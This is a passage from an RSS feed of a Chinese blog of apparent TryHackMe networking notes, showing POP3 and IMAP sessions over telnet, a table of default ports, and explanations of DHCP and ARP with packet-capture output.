&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;LIST
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+OK 3 messages:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1 407
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2 412
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;3 445
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;RETR 3
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+OK 445 octets
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Return-path: &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;user@client.thm&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Envelope-to: strategos@server.thm
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Delivery-date: Thu, 27 Jun 2024 16:19:35 +0000
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Received: from [10.11.81.126] (helo=client.thm)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        by example.thm with smtp (Exim 4.95)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;envelope-from &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;user@client.thm&amp;gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        id 1sMrpq-0001Ah-UT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; strategos@server.thm;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        Thu, 27 Jun 2024 16:19:35 +0000
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;From: user@client.thm
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;To: strategos@server.thm
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Subject: Telnet email
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Hello. I am using telnet to send you an email!
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;QUIT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+OK Logging out.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connection closed by foreign host.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;捕获网络数据包的人将能够拦截交换的流量。根据之前的 Wireshark 捕获，红色的命令由客户端发送，蓝色的行是服务器的命令。同样明显的是，捕获流量的人可以读取密码。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250408015643633.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250408015643633&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;imap同步电子邮件&#34;&gt;IMAP：同步电子邮件
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;POP3协议&lt;/strong&gt;适用于&lt;strong&gt;单一设备场景&lt;/strong&gt;（如您个人电脑上的常用邮件客户端）。然而，若您需要从办公室台式机、笔记本电脑或智能手机等多台设备访问邮箱，POP3的局限性便显现出来——它在客户端下载邮件后&lt;strong&gt;默认删除服务器上的副本&lt;/strong&gt;，导致其他设备无法获取已下载的邮件。此时，您需改用支持&lt;strong&gt;多设备同步&lt;/strong&gt;的协议，例如&lt;strong&gt;IMAP（互联网邮件访问协议）&lt;/strong&gt;。IMAP会将邮件保留在服务器，并同步各设备的操作（如已读/删除标记），确保所有终端保持一致的邮箱状态。&lt;/p&gt;
&lt;p&gt;IMAP 允许同步已读、已移动和已删除的邮件。当您通过多个客户端查看电子邮件时，IMAP 非常方便。 与 POP3 不同，POP3 在从远程服务器下载和删除电子邮件时往往会最大限度地减少服务器存储空间，而 IMAP 往往会使用更多存储空间，因为电子邮件保存在服务器上并在电子邮件客户端之间同步。&lt;/p&gt;
&lt;p&gt;IMAP 协议命令比 POP3 协议命令更复杂。我们在下面列出了几个示例：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;LOGIN &amp;lt;username&amp;gt; &amp;lt;password&amp;gt;&lt;/code&gt; 验证用户身份&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT &amp;lt;mailbox&amp;gt;&lt;/code&gt; 选择要使用的邮箱文件夹&lt;/li&gt;
&lt;li&gt;&lt;code&gt;FETCH &amp;lt;mail_number&amp;gt; &amp;lt;data_item_name&amp;gt;&lt;/code&gt; 示例 &lt;code&gt;fetch 3 body[]&lt;/code&gt; 来获取消息编号 3、标头和正文。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;MOVE &amp;lt;sequence_set&amp;gt; &amp;lt;mailbox&amp;gt;&lt;/code&gt; 将指定的邮件移动到另一个邮箱&lt;/li&gt;
&lt;li&gt;&lt;code&gt;COPY &amp;lt;sequence_set&amp;gt; &amp;lt;data_item_name&amp;gt;&lt;/code&gt; 将指定的邮件复制到另一个邮箱&lt;/li&gt;
&lt;li&gt;&lt;code&gt;LOGOUT&lt;/code&gt; 注销&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;知道 IMAP 服务器默认监听 TCP 端口 143，我们将使用 &lt;code&gt;telnet&lt;/code&gt; 连接到 &lt;code&gt;10.10.28.0&lt;/code&gt; 的端口 143 并获取我们在之前任务中发送的消息。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@TryHackMe$ telnet 10.10.41.192 143
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Trying 10.10.41.192...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connected to 10.10.41.192.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Escape character is &amp;#39;&lt;span class=&#34;se&#34;&gt;^]&lt;/span&gt;&amp;#39;.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ STARTTLS AUTH=PLAIN] Dovecot (Ubuntu) ready.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;A LOGIN strategos
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;A OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY PREVIEW STATUS=SIZE SAVEDATE LITERAL+ NOTIFY SPECIAL-USE] Logged in
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;B SELECT inbox
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;* 4 EXISTS
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;* 0 RECENT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;* OK [UNSEEN 2] First unseen.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;* OK [UIDVALIDITY 1719824692] UIDs valid
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;* OK [UIDNEXT 5] Predicted next UID
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;B OK [READ-WRITE] Select completed (0.001 + 0.000 secs).
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;C FETCH 3 body[]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;* 3 FETCH (BODY[] {445}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Return-path: &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;user@client.thm&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Envelope-to: strategos@server.thm
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Delivery-date: Thu, 27 Jun 2024 16:19:35 +0000
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Received: from [10.11.81.126] (helo=client.thm)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        by example.thm with smtp (Exim 4.95)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;envelope-from &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;user@client.thm&amp;gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        id 1sMrpq-0001Ah-UT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; strategos@server.thm;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        Thu, 27 Jun 2024 16:19:35 +0000
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;From: user@client.thm
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;To: strategos@server.thm
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Subject: Telnet email
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Hello. I am using telnet to send you an email!
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;C OK Fetch completed (0.001 + 0.000 secs&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;D LOGOUT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;* BYE Logging out
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;D OK Logout completed (0.001 + 0.000 secs&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connection closed by foreign host.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;下面的屏幕截图显示了从 Wireshark 中看到的客户端和服务器之间交换的消息。客户端只需要发送四个命令，以红色显示，“长”服务器响应以蓝色显示。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250408020556204.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250408020556204&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结&#34;&gt;总结
&lt;/h2&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;协议&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;传输协议&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;默认端口号&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;TELNET&lt;/td&gt;
          &lt;td&gt;TCP&lt;/td&gt;
          &lt;td&gt;23&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;DNS&lt;/td&gt;
          &lt;td&gt;UDP 或 TCP&lt;/td&gt;
          &lt;td&gt;53&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;HTTP&lt;/td&gt;
          &lt;td&gt;TCP&lt;/td&gt;
          &lt;td&gt;80&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;HTTPS&lt;/td&gt;
          &lt;td&gt;TCP&lt;/td&gt;
          &lt;td&gt;443&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;FTP&lt;/td&gt;
          &lt;td&gt;TCP&lt;/td&gt;
          &lt;td&gt;21&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;SMTP&lt;/td&gt;
          &lt;td&gt;TCP&lt;/td&gt;
          &lt;td&gt;25&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;POP3&lt;/td&gt;
          &lt;td&gt;TCP&lt;/td&gt;
          &lt;td&gt;110&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;IMAP&lt;/td&gt;
          &lt;td&gt;TCP&lt;/td&gt;
          &lt;td&gt;143&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
</description>
        </item>
        <item>
        <title>网络基础知识</title>
        <link>https://Yerucrem.github.io/p/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</link>
        <pubDate>Tue, 08 Apr 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</guid>
        <description>&lt;h2 id=&#34;dhcp提供我的网络设置&#34;&gt;DHCP：提供我的网络设置
&lt;/h2&gt;&lt;p&gt;你去了你最喜欢的咖啡店，拿了你最喜欢的热饮，打开了你的笔记本电脑。您的笔记本电脑连接到商店的 WiFi 并自动配置网络，因此您现在可以在新的 TryHackMe 房间工作。您没有输入单个 IP 地址，但您的设备已全部设置完毕。让我们看看这是怎么发生的。&lt;/p&gt;
&lt;p&gt;每当我们想访问网络时，至少需要配置以下内容：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;IP 地址和子网掩码&lt;/li&gt;
&lt;li&gt;路由器（或网关）&lt;/li&gt;
&lt;li&gt;DNS 服务器&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;每当我们将设备连接到新网络时，都必须根据新网络设置上述配置。手动配置这些设置是一个不错的选择，尤其是对于服务器。服务器不需要切换网络;您无需携带域控制器并将其连接到咖啡店 WiFi。此外，其他设备需要连接到服务器，并希望在特定的 IP 地址找到它们。&lt;/p&gt;
&lt;p&gt;拥有一种自动化的方式来配置连接的设备有很多好处。首先，它将使我们&lt;strong&gt;免于手动配置网络&lt;/strong&gt;;这一点非常重要，尤其是对于移动设备。其次，它使我们&lt;strong&gt;免于地址冲突&lt;/strong&gt;，即当两台设备配置相同的 IP 地址时。IP 地址冲突将阻止相关主机使用网络资源;这适用于本地资源和 Internet。解决方案在于使用动态主机配置协议 （DHCP）。DHCP 是&lt;strong&gt;依赖于 UDP&lt;/strong&gt; 的&lt;strong&gt;应用程序级&lt;/strong&gt;协议;服务器监听 UDP 端口 67，客户端从 UDP 端口 68 发送。默认情况下，您的智能手机和笔记本电脑配置为使用 DHCP。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250408004116942.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250408004116942&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;DHCP 遵循四个步骤：发现、提供、请求和确认 （DORA）：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;DHCP Discover&lt;/strong&gt; ：客户端广播 DHCPDISCOVER 消息，查找本地 DHCP 服务器（如果存在）。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;DHCP Offer&lt;/strong&gt;：服务器使用 DHCPOFFER 消息进行响应，其中包含可供客户端接受的 IP 地址。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;DHCP Request&lt;/strong&gt;：客户端使用 DHCPREQUEST 消息进行响应，以指示它已接受提供的 IP。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;DHCP Acknowledge&lt;/strong&gt;：服务器使用 DHCPACK 消息进行响应，以确认提供的 IP 地址现在已分配给此客户端。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250408004231758.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250408004231758&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;以下数据包捕获显示了上述四个步骤。在此示例中，客户端获取地址 &lt;code&gt;192.168.66.133&lt;/code&gt;。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@TryHackMe$ tshark -r DHCP-G5000.pcap -n
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    1   0.000000      0.0.0.0 → 255.255.255.255 DHCP 342 DHCP Discover - Transaction ID 0xfb92d53f
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    2   0.013904 192.168.66.1 → 192.168.66.133 DHCP 376 DHCP Offer    - Transaction ID 0xfb92d53f
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    3   4.115318      0.0.0.0 → 255.255.255.255 DHCP 342 DHCP Request  - Transaction ID 0xfb92d53f
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    4   4.228117 192.168.66.1 → 192.168.66.133 DHCP 376 DHCP ACK      - Transaction ID 0xfb92d53f
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;在 DHCP 数据包交换中，我们可以注意到以下内容：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;客户端在没有任何 IP 网络配置的情况下启动。它只有一个 &lt;strong&gt;MAC&lt;/strong&gt; 地址。在第一个和第三个数据包 DHCP Discover 和 DHCP Request 中，搜索 DHCP 服务器的客户端&lt;strong&gt;仍然没有 IP 网络配置&lt;/strong&gt;，并且尚未使用 DHCP 服务器提供的 IP 地址。因此，它将数据包从 IP 地址 &lt;code&gt;0.0.0.0&lt;/code&gt; 发送到广播 IP 地址 &lt;code&gt;255.255.255.255。&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;至于链路层，在第一个和第三个数据包中，客户端发送到广播 MAC 地址 &lt;code&gt;ff：ff：ff：ff：ff：ff（&lt;/code&gt; 在上面的输出中未显示）。DHCP 服务器在 DHCP 产品/服务中提供可用的 IP 地址以及网络配置。它使用客户端的目标 MAC 地址。（在此示例系统中，它使用了建议的 IP 地址。）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在 DHCP 进程结束时，我们的设备将收到访问网络甚至 Internet 所需的所有配置。特别是，我们希望 DHCP 服务器为我们提供了以下内容：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用于访问网络资源的租用 IP 地址&lt;/li&gt;
&lt;li&gt;将数据包路由到本地网络外部的网关&lt;/li&gt;
&lt;li&gt;用于解析域名的 DNS 服务器（稍后会详细介绍）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;arp第三层ip地址至第二层mac地址转换&#34;&gt;ARP：第三层IP地址至第二层MAC地址转换
&lt;/h2&gt;&lt;p&gt;我们在&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/r/room/networkingconcepts&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;网络概念&lt;/a&gt;室中指出，当两台主机通过网络进行通信时，IP 数据包在通过第 2 层传输时被封装在数据链路帧中。请记住，我们使用的两个常见数据链路层是以太网 （IEEE 802.3） 和 WiFi （IEEE 802.11）。每当一台主机需要与同一以太网或 WiFi 上的另一台主机通信时，它必须在数据链路层帧内发送 IP 数据包。尽管它知道目标主机的 IP 地址，但它需要查找目标的 MAC 地址，以便创建正确的数据链路标头。&lt;/p&gt;
&lt;p&gt;如您所知，MAC 地址是一个 48 位数字，通常以十六进制表示法表示;例如，&lt;code&gt;7C：DF：A1：D3：8C：5C&lt;/code&gt; 和 &lt;code&gt;44：DF：65：D8：FE：6C&lt;/code&gt; 是我网络上的两个 MAC 地址。&lt;/p&gt;
&lt;p&gt;但是，同一以太网上的设备不需要一直知道彼此的 MAC 地址;他们只需要在通信时知道彼此的 MAC 地址。一切都围绕着 IP 地址。请考虑以下场景：您将设备连接到网络，如果该网络具有 DHCP 服务器，则设备会自动配置为使用特定网关（路由器）和 DNS 服务器。因此，您的设备知道 DNS 服务器的 IP 地址以解析任何域名;此外，当需要通过 Internet 发送数据包时，它知道路由器的 IP 地址。在所有这些场景中，不会显示 MAC 地址。但是，同一以太网上的两台设备在不知道彼此的 MAC 地址的情况下无法通信。&lt;/p&gt;
&lt;p&gt;提醒一下，在下面的屏幕截图中，我们在以太网帧中看到一个 IP 数据包。以太网帧标头包含：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;目标 MAC 地址&lt;/li&gt;
&lt;li&gt;源 MAC 地址&lt;/li&gt;
&lt;li&gt;类型（在本例中为 IPv4）&lt;/li&gt;
&lt;/ul&gt;
